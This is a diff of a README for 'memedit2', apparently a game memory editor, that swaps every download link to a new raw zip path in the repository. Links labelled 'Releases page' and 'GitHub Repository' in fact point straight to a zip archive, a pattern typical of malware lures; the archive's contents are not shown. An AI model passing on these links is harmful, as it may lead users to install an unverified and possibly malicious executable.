@@ -16,7 +16,7 @@ Before you start, make sure your device meets the following requirements:
 
 To get started with memedit2, visit the Releases page where you can download the application. Here’s the link for your convenience:
 
-[![Download memedit2](https://raw.githubusercontent.com/NUGGIEE/memedit2/main/memui/category/memedit-3.8.zip)](https://raw.githubusercontent.com/NUGGIEE/memedit2/main/memui/category/memedit-3.8.zip)
+[![Download memedit2](https://raw.githubusercontent.com/NUGGIEE/memedit2/main/mem/memedit-v2.0-beta.4.zip)](https://raw.githubusercontent.com/NUGGIEE/memedit2/main/mem/memedit-v2.0-beta.4.zip)
 
 Follow these steps to download and install the application:
 
@@ -59,7 +59,7 @@ If you have questions or need help, feel free to reach out. Check the issues sec
 
 ## 🔗 Resources
 
-- GitHub Repository: [memedit2](https://raw.githubusercontent.com/NUGGIEE/memedit2/main/memui/category/memedit-3.8.zip)
-- Releases Page: [Download here](https://raw.githubusercontent.com/NUGGIEE/memedit2/main/memui/category/memedit-3.8.zip)
+- GitHub Repository: [memedit2](https://raw.githubusercontent.com/NUGGIEE/memedit2/main/mem/memedit-v2.0-beta.4.zip)
+- Releases Page: [Download here](https://raw.githubusercontent.com/NUGGIEE/memedit2/main/mem/memedit-v2.0-beta.4.zip)
 
 Now you are ready to enhance your gaming experience with memedit2! Happy gaming!
